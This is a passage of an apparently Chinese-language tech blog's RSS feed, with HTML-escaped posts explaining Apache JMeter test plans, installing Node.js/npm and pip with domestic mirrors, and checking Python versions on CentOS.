&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;options&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;--headless&amp;#34;&lt;/span&gt;)
options&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;window-size=1920x1080&amp;#39;&lt;/span&gt;)
options&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_argument(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--start-maximized&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# 警告，针对不同内核方法可能有差别，但参数一致。&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Net—JMeter 性能测试工具</title>
        <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netjmeter-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Wed, 25 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/netjmeter-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考文献：&lt;a class=&#34;link&#34; href=&#34;https://jmeter.apache.org/usermanual/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; JMeter 用户文档 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1apache-jmeter&#34;&gt;1.Apache JMeter™&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Apache JMeter™&lt;/strong&gt; 是一个开源的，纯 Java 编写的性能测试软件。JMeter 可以运行在任何具有合规 Java 的系统上（即有 Java 环境），&lt;a class=&#34;link&#34; href=&#34;http://jmeter.apache.org/download_jmeter.cgi&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;下载最新的生产版本&lt;/a&gt;后，进入 bin 文件夹，运行  &lt;strong&gt;jmeter.bat&lt;/strong&gt; （用于 Windows）或  &lt;strong&gt;jmeter&lt;/strong&gt;（用于 Unix）文件启动 JMeter。&lt;/p&gt;
&lt;h2 id=&#34;2如何开始&#34;&gt;2.如何开始&lt;/h2&gt;
&lt;p&gt;测试计划描述了 JMeter 在运行时将执行的一系列步骤。完整的测试计划将由一个或多个线程组、逻辑控制器、生成控制器、监听器、计时器、断言和配置元素（Thread Groups，logic controllers，sample generating controllers，listeners，timers，assertions  and  configuration elements）组成。&lt;/p&gt;
&lt;h3 id=&#34;21-添加和删除元素&#34;&gt;2.1 添加和删除元素&lt;/h3&gt;
&lt;p&gt;通过右键单击树中的元素，并从&amp;quot;&lt;strong&gt;add&lt;/strong&gt;&amp;quot; 列表中选择新元素，就可以在测试计划中添加元素。&lt;/p&gt;
&lt;h3 id=&#34;22-配置树元素&#34;&gt;2.2 配置树元素&lt;/h3&gt;
&lt;p&gt;测试树中的任何元素都会在 JMeter 的右侧框架中呈现控件。这些控件允许您配置该特定测试元素的行为。元素的配置取决于元素的类型。测试树本身可以通过拖动和丢弃测试树周围的组件来操作。&lt;/p&gt;
&lt;h3 id=&#34;23-保存测试计划&#34;&gt;2.3 保存测试计划&lt;/h3&gt;
&lt;p&gt;我们建议您在运行之前将测试计划保存到文件中。要保存测试计划，请从文件菜单中选择 &amp;ldquo;&lt;strong&gt;Save&lt;/strong&gt;&amp;rdquo; 或 &amp;ldquo;&lt;strong&gt;Save Test Plan As &amp;hellip;&lt;/strong&gt;&amp;rdquo;&lt;/p&gt;
&lt;p&gt;JMeter 允许您保存整个测试计划树或仅保存其中的一部分。要仅保存位于测试计划树特定&amp;quot;分支&amp;quot;中的元素，请选择从该树开始&amp;quot;分支&amp;quot;的树中的测试计划元素，然后单击右鼠标按钮选择 &amp;ldquo;&lt;strong&gt;Save Selection As …&lt;/strong&gt;&amp;rdquo; 或者从编辑菜单中选择  &amp;ldquo;&lt;strong&gt;Save Selection As …&lt;/strong&gt;&amp;quot;。&lt;/p&gt;
&lt;h3 id=&#34;24-运行测试计划&#34;&gt;2.4 运行测试计划&lt;/h3&gt;
&lt;p&gt;要运行您的测试计划，请从 &amp;ldquo;&lt;strong&gt;Run&lt;/strong&gt;&amp;rdquo; 菜单项中选择 &amp;ldquo;&lt;strong&gt;Start&lt;/strong&gt;&amp;quot;。当 JMeter 运行时，它会在菜单栏下方的部分右侧显示一个小的绿色框。绿色框左侧的数字是活动线程 / 线程总数。这些仅适用于本地运行测试；它们不包括在使用客户端服务器模式时在远程系统上启动的任何线程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;仅在调试测试计划时才应使用此处描述的 GUI 模式。要运行真正的负载测试，请使用 CLI 模式。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;25-停止测试&#34;&gt;2.5 停止测试&lt;/h3&gt;
&lt;p&gt;菜单中提供两种类型的停止命令：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Stop&lt;/strong&gt; - 如果可能，立即停止线程。停止命令将检查所有线程是否在默认超时内停止，即 5000 ms = 5 秒，[ 这可以使用 JMeter 属性&lt;strong&gt;jmeterengine.threadstop.wait&lt;/strong&gt; 更改 ]。如果线程未停止，则会提示信息。停止命令可以重试，但如果失败，则必须退出 JMeter 进行清理。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Shutdown&lt;/strong&gt; - 在当前工作结束时停止线程。终止命令不会中断任何活动示例。模式关闭对话框将保持活动状态，直到所有线程停止。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果关闭时间过长。请关闭对话框并选择 &lt;strong&gt;Run&lt;/strong&gt; / &lt;strong&gt;Stop&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当在 CLI 模式下运行 JMeter 时，JMeter CLI 模式将监听特定端口上的命令（ 默认为**4445，**请参阅 JMeter 属性 &lt;strong&gt;jmeterengine.nongui.port&lt;/strong&gt; ），所选端口会显示在控制台窗口中，目前支持的命令包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Shutdown&lt;/strong&gt; - 优雅的关闭&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;StopTestNow&lt;/strong&gt; - 立即关闭&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些命令可以通过 &lt;strong&gt;shutdown[ .cmd | .sh ]&lt;/strong&gt; 或 &lt;strong&gt;stoptest[ .cmd | .sh ]&lt;/strong&gt; 脚本发送。这些脚本将在 JMeter &lt;strong&gt;Bin&lt;/strong&gt;目录中找到。&lt;/p&gt;
&lt;h3 id=&#34;26错误报告&#34;&gt;2.6错误报告&lt;/h3&gt;
&lt;p&gt;JMeter 向 &lt;strong&gt;jmeter .log&lt;/strong&gt; 文件写入有关测试运行本身的一些信息报告警告和错误。&lt;/p&gt;
&lt;p&gt;采样错误（例如 HTTP 404 - 未找到的文件）通常不在日志文件中报告。相反，这些存储为样本结果的属性。示例结果的状态可以在各种不同的监听器中看到。&lt;/p&gt;
&lt;h2 id=&#34;1线程组thread-group&#34;&gt;1.线程组Thread Group&lt;/h2&gt;
&lt;p&gt;一个性能测试请求负载是基于一个线程组完成的。一个测试计划必须有一个线程组。在测试计划下面多个线程是并行执行的，也就是说这些线程组是同时被初始化并同时执行线程组下的 Sampler 的。&lt;/p&gt;
&lt;p&gt;线程组主要包含三个参数：线程数、准备时长（Ramp-Up Period(in seconds)）、循环次数。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;线程数：虚拟用户数。一个虚拟用户占用一个进程或线程。设置多少虚拟用户数在这里也就是设置多少个线程数。&lt;/li&gt;
&lt;li&gt;准备时长：设置的虚拟用户数需要多长时间全部启动。如果线程数为20 ，准备时长为10 ，那么需要10秒钟启动20个线程。也就是每秒钟启动2个线程。&lt;/li&gt;
&lt;li&gt;循环次数：每个线程发送请求的次数。如果线程数为20 ，循环次数为100 ，那么每个线程发送100次请求。总请求数为20*100=2000 。如果勾选了永远，那么所有线程会一直发送请求，直到选择停止运行脚本。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2逻辑控制器logic-controllers&#34;&gt;2.逻辑控制器Logic Controllers&lt;/h2&gt;
&lt;p&gt;逻辑控制器允许您自定义 JMeter 用于决定何时发送请求的逻辑，其可以更改来自子元素的请求顺序。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Test Plan&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Thread Group&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Once Only Controller&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;Login Request (an HTTP Request)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Load Search Page (HTTP Sampler)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Interleave Controller&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;Search &amp;ldquo;A&amp;rdquo; (HTTP Sampler)&lt;/li&gt;
&lt;li&gt;Search &amp;ldquo;B&amp;rdquo; (HTTP Sampler)&lt;/li&gt;
&lt;li&gt;HTTP default request (Configuration Element)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HTTP default request (Configuration Element)&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Cookie Manager (Configuration Element)&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;参考以上示例测试树，‎此测试的第一件事是登录请求，这个请求仅在第一次执行，后续迭代将会跳过。这是由于其受到‎‎ &lt;strong&gt;Once Only Controller‎&lt;/strong&gt; 的影响。登录后，下一个采样器是加载搜索页面（想象用户登录的 Web 应用程序，然后转到搜索页面进行搜索）。这只是一个简单的请求，因此没有任何逻辑控制器过滤。‎&lt;/p&gt;
&lt;p&gt;‎加载搜索页面后，我们要进行搜索，我们希望在每次搜索之间重新加载搜索页面本身，即这个过程实际上就是 4 个简单的 HTTP 请求元素：加载搜索、搜索&amp;quot;A&amp;rdquo;、加载搜索、搜索&amp;quot;B&amp;rdquo; 。因此，我们可以使用‎ &lt;strong&gt;‎Interleave Controller&lt;/strong&gt; 迭代控制器，这个控制器每次测试都会传递一个子请求，然后保留其子元素的迭代（即它不会随机传递，能&amp;quot;记住&amp;quot;位置）。&lt;/p&gt;
&lt;p&gt;注意到 &lt;strong&gt;Interleave Controller &amp;gt; HTTP default request&lt;/strong&gt; ，这是迭代控制器里样本的 HTTP 请求默认值，我们可以想象下，&amp;ldquo;搜索 A&amp;quot;和&amp;quot;搜索 B&amp;quot;都是共享相同的路径信息的，比如 HTTP 请求域、端口、方法、协议、路径和参数以及其他可选项目，那我们就可以将这些信息提取，然后共同配置，而不用为每一个采样器单独配置，&lt;strong&gt;HTTP default request&lt;/strong&gt; 就是这样一个工具。&lt;/p&gt;
&lt;p&gt;‎最后一个元素是 ‎‎&lt;strong&gt;Cookie Manager&lt;/strong&gt;。所有网络测试中都应添加 Cookie 管理器，否则 JMeter 将忽略 Cookie。通过在线程组级别添加它，我们确保所有 HTTP 请求将共享相同的 Cookie&lt;/p&gt;
&lt;p&gt;更多：请参阅 ‎&lt;a class=&#34;link&#34; href=&#34;https://jmeter.apache.org/usermanual/component_reference.html#logic_controllers&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;‎内置逻辑控制器列表&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;3采样器samplers&#34;&gt;3.采样器Samplers&lt;/h2&gt;
&lt;p&gt;‎采样器告诉 JMeter 将请求发送到服务器并等待响应，运行时，线程组会按照采样器出现在树上的顺序逐个进行处理，JMeter 取样器包括：‎&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;‎FTP 请求‎&lt;/li&gt;
&lt;li&gt;‎HTTP 请求（也可用于 SOAP 或 REST 网络服务）‎&lt;/li&gt;
&lt;li&gt;‎JDBC 请求‎&lt;/li&gt;
&lt;li&gt;‎Java 对象请求‎&lt;/li&gt;
&lt;li&gt;‎JMS 请求‎&lt;/li&gt;
&lt;li&gt;‎JUnit Test 请求‎&lt;/li&gt;
&lt;li&gt;‎LDAP 请求‎&lt;/li&gt;
&lt;li&gt;‎邮件请求‎&lt;/li&gt;
&lt;li&gt;‎操作系统进程请求‎&lt;/li&gt;
&lt;li&gt;‎TCP 请求‎&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4测试片段test-fragments&#34;&gt;4.测试片段Test Fragments&lt;/h2&gt;
&lt;p&gt;‎测试片段元件是与线程组元件处于同一级别的测试计划树上的特殊‎‎控制器‎‎类型。它与线程组不同，它不会被执行，除非它被‎‎ &lt;strong&gt;Module Controller&lt;/strong&gt; 或 &lt;strong&gt;Include Controller&lt;/strong&gt; 引用。‎此元素纯粹用于测试计划中的代码重用‎。&lt;/p&gt;
&lt;h2 id=&#34;5监听器listeners&#34;&gt;5.监听器Listeners&lt;/h2&gt;
&lt;p&gt;Jmeter中使用监听器元件收集取样器记录的数据并以可视化的方式来呈现。Jmeter有各种不同的监听器类型。&lt;/p&gt;
&lt;p&gt;例如聚合报告：右键点击线程组，在弹出菜单（添加&amp;mdash;&amp;gt;监听器&amp;mdash;&amp;gt;聚合报告）中选择聚合报告。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Label：请求的名称&lt;/li&gt;
&lt;li&gt;Samples：总共发给服务器的请求数量&lt;/li&gt;
&lt;li&gt;Average：单个请求的平均响应时间，单位是毫秒&lt;/li&gt;
&lt;li&gt;Median： 50%的请求的响应时间小于&lt;/li&gt;
&lt;li&gt;90%Line： 90%的请求的响应时间小于&lt;/li&gt;
&lt;li&gt;95%Line： 95%的请求的响应时间小于&lt;/li&gt;
&lt;li&gt;99%Line： 99%的请求的响应时间小于&lt;/li&gt;
&lt;li&gt;Min： 最小的响应时间&lt;/li&gt;
&lt;li&gt;Max： 最大的响应时间&lt;/li&gt;
&lt;li&gt;Error%： 错误率=错误的请求的数量/请求的总数&lt;/li&gt;
&lt;li&gt;Throughput： 吞吐量即表示每秒完成的请求数&lt;/li&gt;
&lt;li&gt;Received KB/sec： 每秒从服务器端接收到的数据量&lt;/li&gt;
&lt;li&gt;Sent KB/Sec： 每秒从发送到服务器端的数据量&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;6延时timers&#34;&gt;6.延时Timers&lt;/h2&gt;
&lt;p&gt;默认情况下，JMeter 线程会按顺序执行采样器，而不会暂停。我们建议您通过在&amp;quot;线程组&amp;quot;中添加可用的 &lt;strong&gt;Timers&lt;/strong&gt; 来指定延迟。如果您不添加延迟，JMeter 可能会在很短的时间内提出过多请求，从而压倒服务器。‎&lt;/p&gt;
&lt;h2 id=&#34;7断言assertions&#34;&gt;7.断言Assertions&lt;/h2&gt;
&lt;p&gt;‎断言允许您断言从正在测试的服务器收到的响应。使用断言，您基本上可以&amp;quot;测试&amp;quot;您的应用程序是否正在返回您期望的结果。‎例如，您可以断言查询的响应是否包含某些特定文本。‎您可以向任何采样器添加断言。例如，您可以在 HTTP 请求中添加一个断言，该请求检查文本 ‎‎&amp;rdquo;&lt;!-- raw HTML omitted --&gt;&amp;quot; 。‎‎然后，JMeter 将检查 HTTP 响应中是否存在该文本。如果 JMeter 无法找到文本，则它将标记其为请求失败。‎&lt;/p&gt;
&lt;p&gt;‎请注意，断言适用于其‎‎范围内‎‎的所有采样器。如要将断言限制为单个取样器，应将该断言添加为取样器的子项。‎‎要查看断言结果，请向线程组添加 &lt;strong&gt;Assertion Listener&lt;/strong&gt;，另外失败的断言也将被统计并计入错误百分比中。‎&lt;/p&gt;
&lt;p&gt;右键点击HTTP请求&amp;mdash;-&amp;gt;添加&amp;mdash;-&amp;gt;断言&amp;mdash;-&amp;gt;响应断言&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;要测试的响应字段： 响应文本、Document(text)、URL样本、响应信息、Response Headers等选项。虽然接口返回的是HTML页面，但对于Jmeter来说返回数据为文本，所以，这里可以勾选响应文本。&lt;/li&gt;
&lt;li&gt;模式匹配规则： 包括、匹配、 Equals、Substring。这里只需要验证返回数据中是否包含主要的关键字，所以，这里勾选包括。&lt;/li&gt;
&lt;li&gt;要测试的模式： 其实就是断言的数据。点击添加按钮，输入要断言的数据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;8配置元件configuration-elements&#34;&gt;8.配置元件Configuration Elements&lt;/h2&gt;
&lt;p&gt;‎配置元件与采样器紧密配合。虽然它不发送请求‎‎，但它可以添加或修改请求。‎‎配置元素只能从放置元素的树枝内部访问。例如，如果您将 HTTP Cookie Manager 放置在 Simple Logic Controller 中，则 Cookie 管理器将仅对您放置在简单逻辑控制器内的 HTTP 请求控制器访问。Cookie 可访问&amp;quot;Web Page 1&amp;quot;和&amp;quot;Web Page 2&amp;quot;，但不能访问&amp;quot;Web Page 3&amp;quot;。‎&lt;/p&gt;
&lt;p&gt;‎此外，树枝内的配置元素优先于&amp;quot;父&amp;quot;分支中的相同元素。例如，我们定义了两个 HTTP 请求默认元素，&amp;ldquo;Web Defaults 1&amp;quot;和&amp;quot;Web Defaults 1&amp;rdquo;。由于我们把&amp;quot;Web Defaults 1&amp;quot;放在 Loop Controller 中，因此只有&amp;quot;Web Page 2&amp;quot;才能访问它，其他 HTTP 请求将使用&amp;quot;Web 默认值 2&amp;quot;。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291749981.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291749981.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;‎Configuration Elements 无论被放置在哪里，其都会在测试开始时处理，但我们还是建议该元素放在线程组的开头。‎&lt;/p&gt;
&lt;h2 id=&#34;9预处理器pre-processor-elements&#34;&gt;9.预处理器Pre-Processor Elements&lt;/h2&gt;
&lt;p&gt;预处理器在发出取样器请求之前执行某些操作。如果预处理器连接到采样器元件，则它将在该取样器元件运行之前执行。预处理器最常用于在示例请求运行前修改其设置，或更新未从响应文本中提取的变量。&lt;/p&gt;
&lt;h2 id=&#34;10后处理器post-processor-elements&#34;&gt;10.后处理器Post-Processor Elements&lt;/h2&gt;
&lt;p&gt;处理在发出取样器请求后执行某些操作。如果后处理器连接到采样器元件，则它将在采样器元件运行后执行。后处理器最常用于处理响应数据，通常用于从中提取值。&lt;/p&gt;
&lt;h2 id=&#34;11变量&#34;&gt;11.变量&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Test Plan&lt;/strong&gt; 和‎‎ &lt;strong&gt;User Defined Variables&lt;/strong&gt; 配置元件所定义的变量值可在启动时提供给整个测试计划。当你定义变量后，在测试计划中可以使用 &lt;strong&gt;${HOST}&lt;/strong&gt;  或 &lt;strong&gt;${THREADS}&lt;/strong&gt; 来使用变量&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Linux—npm 包管理工具</title>
        <link>https://ac-lm.github.io/posts/linux/linuxnpm-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Tue, 24 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxnpm-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h2 id=&#34;1npm&#34;&gt;1.npm&lt;/h2&gt;
&lt;p&gt;npm是一款包管理工具，允许用户从npm服务器下载别人编写的第三方包或命令行程序到本地使用。&lt;/p&gt;
&lt;p&gt;由于npm是随Node.js一起安装的，所以我们安装Node.js即可安装npm&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget https://cdn.npm.taobao.org/dist/node/latest-v15.x/node-v15.9.0-linux-x64.tar.gz &lt;span style=&#34;color:#75715e&#34;&gt;#下载源码&lt;/span&gt;
tar -zxvf node-v15.9.0-linux-x64.tar.gz &lt;span style=&#34;color:#75715e&#34;&gt;#解压文件&lt;/span&gt;
vim /etc/profile &lt;span style=&#34;color:#75715e&#34;&gt;#编辑环境变量&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;####&lt;/span&gt;
export PATH&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$PATH:/opt/node-v15.9.0/bin
&lt;span style=&#34;color:#75715e&#34;&gt;####&lt;/span&gt;
source /etc/profile &lt;span style=&#34;color:#75715e&#34;&gt;#启用环境 配置后启动环境，若配置环境后无法使用，需运行此命令&lt;/span&gt;
node -v
npm -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2npm配置&#34;&gt;2.npm配置&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 下载源配置&lt;/span&gt;
npm config set registry https://registry.npm.taobao.org
npm config get registry
&lt;span style=&#34;color:#75715e&#34;&gt;# 查看当前目录已安装插件&lt;/span&gt;
npm list
&lt;span style=&#34;color:#75715e&#34;&gt;# 安装cnpm，淘宝团队做的国内镜像npm&lt;/span&gt;
npm install -g cnpm --registry&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;https://registry.npm.taobao.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—pip 软件管理工具</title>
        <link>https://ac-lm.github.io/posts/linux/linuxpip-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
        <pubDate>Mon, 23 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxpip-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
        <description>&lt;h2 id=&#34;1pip&#34;&gt;1.pip&lt;/h2&gt;
&lt;p&gt;不同于 python3 自带 pip 软件管理工具，python2 并不自带，需要自己安装&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
&lt;span style=&#34;color:#75715e&#34;&gt;# pip3 wget https://bootstrap.pypa.io/get-pip.py&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# wget下载命令，会下载到当前目录，如报错，yum -y install wget&lt;/span&gt;
python get-pip.py &lt;span style=&#34;color:#75715e&#34;&gt;#编译&lt;/span&gt;
pip  -V
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;PS：如果不想自己安装，可以使用&lt;code&gt;yum install python3&lt;/code&gt;安装 python3 来使用 pip，命令 &lt;code&gt;pip3 -V&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;2修改pip下载源&#34;&gt;2.修改pip下载源&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip -i https://pypi.douban.com/simple install Flask --trusted-host pypi.douban.com &lt;span style=&#34;color:#75715e&#34;&gt;#手动指定&lt;/span&gt;
pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/ &lt;span style=&#34;color:#75715e&#34;&gt;#环境指定&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;###############&lt;/span&gt;
清华：https://pypi.tuna.tsinghua.edu.cn/simple
阿里云：https://mirrors.aliyun.com/pypi/simple/
中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/
华中理工大学：https://pypi.hustunique.com/
山东理工大学：https://pypi.sdutlinux.org/
豆瓣：https://pypi.douban.com/simple/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;PS：如果系统报错&lt;code&gt;ERROR: unknown command &amp;quot;config&amp;quot;&lt;/code&gt;，这是因为 pip 版本过低，使用命令 &lt;code&gt;pip install -U pip&lt;/code&gt;即可&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;3pip的使用&#34;&gt;3.pip的使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;pip list  &lt;span style=&#34;color:#75715e&#34;&gt;#已安装&lt;/span&gt;
pip list --outdated  &lt;span style=&#34;color:#75715e&#34;&gt;#可更新&lt;/span&gt;
pip install --upgrade 包  &lt;span style=&#34;color:#75715e&#34;&gt;#更新&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Linux—Python3.6 安装</title>
        <link>https://ac-lm.github.io/posts/linux/linuxpython3.6-%E5%AE%89%E8%A3%85/</link>
        <pubDate>Sun, 22 Nov 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/linux/linuxpython3.6-%E5%AE%89%E8%A3%85/</guid>
        <description>&lt;h2 id=&#34;1前言&#34;&gt;1.前言&lt;/h2&gt;
&lt;p&gt;Linux 系统自带 Python2，这是由于部分命令需要使用 Python2，如 yum，要使用 Python3 则需另外安装。（本文使用的是 CentOS7 ，其他发行版大同小异）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python -V &lt;span style=&#34;color:#75715e&#34;&gt;#查看Py版本&lt;/span&gt;
python -m XXXX  &lt;span style=&#34;color:#75715e&#34;&gt;#执行终端命令，-m参数使得Python预先import你要的package或module给你，然后再执行script。&lt;/span&gt;
which python &lt;span style=&#34;color:#75715e&#34;&gt;#查看python命令是连接到那个文件&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;####&lt;/span&gt;
/usr/bin/python
&lt;span style=&#34;color:#75715e&#34;&gt;####&lt;/span&gt;
cd /usr/bin/ &lt;span style=&#34;color:#75715e&#34;&gt;#进入bin文件夹&lt;/span&gt;
ll python*  &lt;span style=&#34;color:#75715e&#34;&gt;#列出包含python字段的文件&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;####&lt;/span&gt;
lrwxrwxrwx. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root   &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; 11月 &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; 11:42 python -&amp;gt; /usr/bin/python2
lrwxrwxrwx. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root    &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; 11月 &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 11:01 python2 -&amp;gt; python2.7
-rwxr-xr-x. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;7144&lt;/span&gt; 10月 &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; 22:46 python2.7
-rwxr-xr-x. &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;1835&lt;/span&gt; 10月 &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; 22:45 python2.7-config
